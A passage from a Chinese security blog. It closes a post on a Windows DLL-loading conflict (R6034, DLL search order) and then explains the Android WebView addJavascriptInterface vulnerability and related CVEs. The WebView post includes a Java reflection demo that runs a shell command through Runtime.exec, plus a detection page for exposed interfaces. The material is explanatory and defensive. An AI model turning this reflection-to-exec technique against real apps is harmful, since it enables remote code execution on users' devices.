-<p>发现其实ycm_client_support.pyd已经使用了manifest，但是仍然出现R6034错误。上网搜索了一番（见文末的参考链接），发现这就是非常著名的DLL Hell了，维基百科中专门记录了这个问题。 <a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Dll_hell">http://en.wikipedia.org/wiki/Dll_hell</a></p>
-<p>不论如何应该就是DLL加载时出错了，可以使用Process Explorer 工具来查看出问题的进程，看看在进程空间内具体是什么情况。</p>
-<p><img src="https://raw.githubusercontent.com/henices/pictures/master/process-explorer.png" alt="p-e"></p>
-<p>哈哈，发现了一些情况，msvcr90.dll在gvim进程空间里有两个！再看看这两个DLL的位置。</p>
-<p><img src="https://raw.githubusercontent.com/henices/pictures/master/process-explorer1.png" alt="p-e1"></p>
-<p><img src="https://raw.githubusercontent.com/henices/pictures/master/process-explorer2.png" alt="p-e2"></p>
-<p>删除掉不在C:\WINDOWS\WinSxS\目录里的msvcr90.dll，问题得以解决。由于这个错误是因为加载ycm_client_support.pyd引起的，再看看ycm_client_support.pyd的情况，拿出TC直接F3一下，又发现了一些有用的信息。ycm_client_support.pyd加载的是cmake目录下的msvcr90.dll, 正常情况下因该使用 C:\Windows\winsxs 目录下的msvcr90.dll</p>
-<p><img src="https://raw.githubusercontent.com/henices/pictures/master/tc1.png" alt="tc1"></p>
-<p><img src="https://raw.githubusercontent.com/henices/pictures/master/tc2.png" alt="tc2"></p>
-<p>查看一下系统环境变量：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">D:\Program Files\Microsoft Visual Studio 9.0\VC&gt; set | findstr Path</span><br><span class="line"></span><br><span class="line">Path=D:\Program Files\Microsoft Visual Studio 9.0\Common7\IDE;D:\Program Files\M</span><br><span class="line">icrosoft Visual Studio 9.0\VC\BIN;D:\Program Files\Microsoft Visual Studio 9.0\C</span><br><span class="line">ommon7\Tools;c:\Windows\Microsoft.NET\Framework\v3.5;c:\Windows\Microsoft.NET\Fr</span><br><span class="line">amework\v2.0.50727;D:\Program Files\Microsoft Visual Studio 9.0\VC\VCPackages;C:</span><br><span class="line">\Program Files\\Microsoft SDKs\Windows\v6.0A\bin;C:\Windows\system32;C:\Windows;</span><br><span class="line">d:\Program Files\CMake 2.8\bin;d:\Program Files\LLVM 3.4.svn\bin;d:\Program File</span><br><span class="line">s\Git\cmd;d:\Python27;D:\Program Files\IDM Computer Solutions\UltraEdit\</span><br><span class="line">PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\</span><br></pre></td></tr></table></figure>
-
-<p>引错误的原因是Windows程序加载DLL是会先加载PATH变量中的DLL文件，后面会加载manifest指定的WinSxS目录的文件，这样就加载了两次，引起了错误。</p>
-<p>这个问题涉及 Windows加载DLL文件的顺序，Windows定位 DLL文件的顺序和一个注册表键值相关，这个键值是：</p>
-<p><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</code></p>
-<p>SafeDllSearchMode的值为1，开启SafeDllSearchMode，<br>SafeDllSearchMode的值为0，禁用SafeDllSearchMode。</p>
-<p>Windows系统默认开启SafeDllSearchMode （Windows XP SP2 后），MSDN文章《Dynamic-Link Library Search Order》中指出，在SafeDllSearchMode开启的情况下，Windows定位DLL文件的顺序为：</p>
-<ol>
-<li>The directory from which the application loaded.</li>
-<li>The system directory. ( GetSystemDirectory )</li>
-<li>The 16-bit system directory.</li>
-<li>The Windows directory. (GetWindowsDirectory )</li>
-<li>The current directory.</li>
-<li>The directories that are listed in the PATH environment variable.</li>
-</ol>
-<p>在SafeDllSearchMode关闭的情况下，Windows定位DLL文件的顺序为：</p>
-<ol>
-<li>The directory from which the application loaded.</li>
-<li>The current directory.</li>
-<li>The system directory. (GetSystemDirectory )</li>
-<li>The 16-bit system directory.</li>
-<li>The Windows directory. ( GetWindowsDirectory)</li>
-<li>The directories that are listed in the PATH environment variable.</li>
-</ol>
-<p>另外，《Dynamic-Link Library Search Order》中指出使用manifest可以指定加载DLL的路径，但实际的情况是有可能加载多个DLL导致进程崩溃。</p>
-<p>Desktop applications can control the location from which a DLL is loaded by specifying a full path, using DLL redirection, or by using a manifest. If none of these methods are used, the system searches for the DLL at load time as described in this section.</p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1]《Windows via C&#x2F;C++ Fifth Edition》<br>[2] Side-by-side Assemblies <a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/aa376307.aspx">http://msdn.microsoft.com/en-us/library/aa376307.aspx</a><br>[3] DLL Hell <a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Dll_hell">http://en.wikipedia.org/wiki/Dll_hell</a><br>[4] C Run-Time Error R6034 <a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/ms235560(v=vs.90).aspx">http://msdn.microsoft.com/en-us/library/ms235560(v=vs.90).aspx</a><br>[5] Understanding Manifest Generation for C&#x2F;C++ Programs <a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/ms235542.aspx">http://msdn.microsoft.com/en-us/library/ms235542.aspx</a><br>[6] Search Path Used by Windows to Locate a DLL <a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/7d83bc18.aspx">http://msdn.microsoft.com/en-us/library/7d83bc18.aspx</a><br>[7] Dynamic-Link Library Search Order <a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx</a><br>[8] <a target="_blank" rel="noopener" href="https://bitbucket.org/Haroogan/vim-youcompleteme-for-windows/src/7dca764c2ee0?at=master">https://bitbucket.org/Haroogan/vim-youcompleteme-for-windows/src/7dca764c2ee0?at=master</a><br>[9] <a target="_blank" rel="noopener" href="https://github.com/Valloric/YouCompleteMe/wiki/Windows-Installation-Guide">https://github.com/Valloric/YouCompleteMe/wiki/Windows-Installation-Guide</a><br>[10] <a target="_blank" rel="noopener" href="http://www.davidlenihan.com/2007/07/winsxs.html">http://www.davidlenihan.com/2007/07/winsxs.html</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/webview_java/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/webview_java/" class="post-title-link" itemprop="url">Android WebView 漏洞</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="☆-来自-developer-android-com-的信息"><a href="#☆-来自-developer-android-com-的信息" class="headerlink" title="☆ 来自 developer.android.com 的信息"></a>☆ 来自 developer.android.com 的信息</h2><p>Android 官方网站对addJavascriptInterface的介绍如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public void addJavascriptInterface (Object object, String name)  Added in API level 1</span><br><span class="line"></span><br><span class="line">Injects the supplied Java object into this WebView. The object is injected into</span><br><span class="line">the JavaScript context of the main frame, using the supplied name. This allows </span><br><span class="line">the Java object&#x27;s methods to be accessed from JavaScript. For applications</span><br><span class="line">targeted to API level JELLY_BEAN_MR1 and above, only public methods that are </span><br><span class="line">annotated with JavascriptInterface can be accessed from JavaScript. For applications</span><br><span class="line">targeted to API level JELLY_BEAN or below, all public methods (including the inherited ones)</span><br><span class="line">can be accessed, see the important security note below for implications.</span><br><span class="line"></span><br><span class="line">Note that injected objects will not appear in JavaScript until the page is next</span><br><span class="line">(re)loaded. For example:</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JsObject</span> &#123;</span><br><span class="line">   <span class="meta">@JavascriptInterface</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="string">&quot;injectedObject&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JsObject</span>(), <span class="string">&quot;injectedObject&quot;</span>);</span><br><span class="line">webView.loadData(<span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">webView.loadUrl(<span class="string">&quot;javascript:alert(injectedObject.toString())&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">This method can be used to allow JavaScript to control the host application. </span><br><span class="line">This is a powerful feature, but also presents a security risk for apps targeting</span><br><span class="line">JELLY_BEAN or earlier. Apps that target a version later than JELLY_BEAN are still</span><br><span class="line">vulnerable if the app runs on a device running Android earlier than 4.2. The </span><br><span class="line">most secure way to use this method is to target JELLY_BEAN_MR1 and to ensure the</span><br><span class="line">method is called only when running on Android 4.2 or later. With these older </span><br><span class="line">versions, JavaScript could use reflection to access an injected object&#x27;s public</span><br><span class="line">fields. Use of this method in a WebView containing untrusted content could allow</span><br><span class="line">an attacker to manipulate the host application in unintended ways, executing </span><br><span class="line">Java code with the permissions of the host application. Use extreme care when </span><br><span class="line">using this method in a WebView which could contain untrusted content.</span><br><span class="line">JavaScript interacts with Java object on a private, background thread of this </span><br><span class="line">WebView. Care is therefore required to maintain thread safety.</span><br><span class="line"></span><br><span class="line">The Java object&#x27;s fields are not accessible.</span><br><span class="line">For applications targeted to API level LOLLIPOP and above, methods of injected </span><br><span class="line">Java objects are enumerable from JavaScript. Parameters object the Java object </span><br><span class="line">to inject into this WebView&#x27;s JavaScript context. Null values are ignored.</span><br><span class="line">name  the name used to expose the object in JavaScript</span><br></pre></td></tr></table></figure>
-
-<p>  之所以提供addJavascriptInterface是为了WebView中的Javascript可以和本地的App<br>  通讯，这确实是一个很强大的功能，这么做的好处在于本地App逻辑不变的情况下，不<br>  需要升级App就可以对程序进行更新，修改相应的Web页面就可以了。</p>
-<h2 id="☆-相关知识"><a href="#☆-相关知识" class="headerlink" title="☆ 相关知识"></a>☆ 相关知识</h2><h3 id="WebView的使用方法"><a href="#WebView的使用方法" class="headerlink" title="WebView的使用方法"></a>WebView的使用方法</h3><p>  在layout中定义 <webview>, 在Activity的onCreate中加入下面的代码</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebView</span> <span class="variable">webview</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(<span class="built_in">this</span>);</span><br><span class="line">setContentView(webview);</span><br><span class="line">webview.loadUrl(<span class="string">&quot;http://slashdot.org/&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<h3 id="Java-Reflection"><a href="#Java-Reflection" class="headerlink" title="Java Reflection"></a>Java Reflection</h3><p>  反射是java语言提供的一种机制，使Java程序可以在运行时检查类、接口、方法和成员，<br>而不需要在编译的时候知道类的名字和方法等细节信息。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> Reflect;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a1</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a2</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    Demo demo=<span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">mObjectClass</span> <span class="operator">=</span> demo.getClass();</span><br><span class="line"></span><br><span class="line">    System.out.println(mObjectClass.getName());</span><br><span class="line"></span><br><span class="line">    Method[] methods = mObjectClass.getMethods();</span><br><span class="line">    <span class="keyword">for</span>(Method method : methods)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method = &quot;</span> + method.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> mObjectClass.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        String[] array = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;id &gt; /tmp/id&quot;</span>&#125;;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">n</span> <span class="operator">=</span> c2.getMethod(<span class="string">&quot;exec&quot;</span>, array.getClass());</span><br><span class="line">        n.invoke(obj, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;array&#125;);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        System.out.println(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt; javac -d . Reflect/hello.java</span><br><span class="line">&gt; java Reflect.hello</span><br><span class="line"></span><br><span class="line">Reflect.Demo</span><br><span class="line">method = a2</span><br><span class="line">method = a1</span><br><span class="line">method = wait</span><br><span class="line">method = wait</span><br><span class="line">method = wait</span><br><span class="line">method = equals</span><br><span class="line">method = toString</span><br><span class="line">method = hashCode</span><br><span class="line">method = getClass</span><br><span class="line">method = notify</span><br><span class="line">method = notifyAll</span><br></pre></td></tr></table></figure>
-
-<p>命令执行成功。</p>
-<h3 id="通过reflection-访问private"><a href="#通过reflection-访问private" class="headerlink" title="通过reflection 访问private"></a>通过reflection 访问private</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> Reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">a1</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;I am a1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a2</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;I am a2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    Demo demo=<span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">mObjectClass</span> <span class="operator">=</span> demo.getClass();</span><br><span class="line"></span><br><span class="line">    System.out.println(mObjectClass.getName());</span><br><span class="line"></span><br><span class="line">    Method[] methods = mObjectClass.getDeclaredMethods();</span><br><span class="line">    <span class="keyword">for</span>(Method method : methods)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method = &quot;</span> + method.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> mObjectClass.newInstance();</span><br><span class="line">        methods[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        methods[<span class="number">0</span>].invoke(o);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>运行结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; javac -d . Reflect/hello.java</span><br><span class="line">&gt; java Reflect.hello</span><br><span class="line"></span><br><span class="line">Reflect.Demo</span><br><span class="line">method = a1</span><br><span class="line">method = a2</span><br><span class="line">I am a1</span><br></pre></td></tr></table></figure>
-
-<p>已经成功调用了Demo的private a1 方法</p>
-<h2 id="☆-相关漏洞"><a href="#☆-相关漏洞" class="headerlink" title="☆  相关漏洞"></a>☆  相关漏洞</h2><h3 id="CVE-2013-4710"><a href="#CVE-2013-4710" class="headerlink" title="CVE-2013-4710"></a>CVE-2013-4710</h3><p>Disney Mobile、eAccess、KDDI、NTT DOCOMO、SoftBank设备上的Android 3.0至4.1.x版<br>本中存在安全漏洞，该漏洞源于程序没有正确实现WebView类。远程攻击者可借助特制的网<br>页利用该漏洞执行任意Java对象的方法或造成拒绝服务（重启）</p>
-<h3 id="CVE-2012-6636-关键的CVE"><a href="#CVE-2012-6636-关键的CVE" class="headerlink" title="CVE-2012-6636  (关键的CVE)"></a>CVE-2012-6636  (关键的CVE)</h3><p>该漏洞源于程序没有正确限制使用WebView.addJavascriptInterface方法，远程攻击者可<br>通过使用Java Reflection 利用该漏洞执行任意Java对象的方法。影响使用 API Level 16<br>以及之前的Android 系统。(Android 4.2 为 API Level 17)</p>
-<h3 id="CVE-2014-1939-searchBoxJavaBridge-in-Android-Jelly-Bean"><a href="#CVE-2014-1939-searchBoxJavaBridge-in-Android-Jelly-Bean" class="headerlink" title="CVE-2014-1939 searchBoxJavaBridge_ in Android Jelly Bean"></a>CVE-2014-1939 searchBoxJavaBridge_ in Android Jelly Bean</h3><p>此漏洞公布了一个可利用的Java Object “searchBoxJavaBridge_”</p>
-<h3 id="CVE-2014-7224"><a href="#CVE-2014-7224" class="headerlink" title="CVE-2014-7224"></a>CVE-2014-7224</h3><p>根据 android&#x2F;webkit&#x2F;AccessibilityInjector.java 代码中的介绍，发现当系统辅助<br>功能中的任意一项服务被开启后，所有由系统提供的WebView都会被加入两个JS objects，<br>分别为是”accessibility”  和 “accessibilityTraversal”。如果APP使用了系统的WebView<br>并且设置了setJavaScriptEnabled()，那么恶意攻击者就可以使用”accessibility” 和<br>“accessibilityTraversal” 这两个Java Bridge来执行远程攻击代码</p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>   这些CVE中最核心的是CVE-2012-6636, 出现的问题是接口定义问题。是非常经典的<br>do a 变成 do b 的例子，后面的修复方法也是保证了do a 就是 do a。</p>
-<h2 id="☆-漏洞检测"><a href="#☆-漏洞检测" class="headerlink" title="☆ 漏洞检测"></a>☆ 漏洞检测</h2><p>   使用WebView访问下面页面，输出的接口名称则存在漏洞。</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>WebView漏洞检测<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0,</span></span></span><br><span class="line"><span class="string"><span class="tag">maximum-scale=1.0, user-scalable=0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>如果当前app存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改：<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> obj <span class="keyword">in</span> <span class="variable language_">window</span>) </span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> <span class="keyword">in</span> <span class="variable language_">window</span>[obj]) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>[obj].<span class="title function_">getClass</span>();</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;&#x27;</span>+obj+<span class="string">&#x27;&lt;/span&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;br /&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;<span class="keyword">catch</span>(e)&#123;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">check</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>   现代浏览器都实现基本一致的BOM，使得JavaScript和浏览器进行消息传递。<br>   是否有getClass的方法，可以作为检测WebView漏洞依据。</p>
-<p>   在Android 4.1.1 原生系统上测试，在默认配置下，存在 searchBoxJavaBridge_<br>   可以利用，CVE-2014-7224上的两个接口，并没有成功暴露。看了源代码后发现必须<br>   打开Accessibility 设置中的Enhance Web accessibility 才会暴露这个两个接口，<br>   因此CVE-2014-7224的影响并不像想象中的那么大。</p>
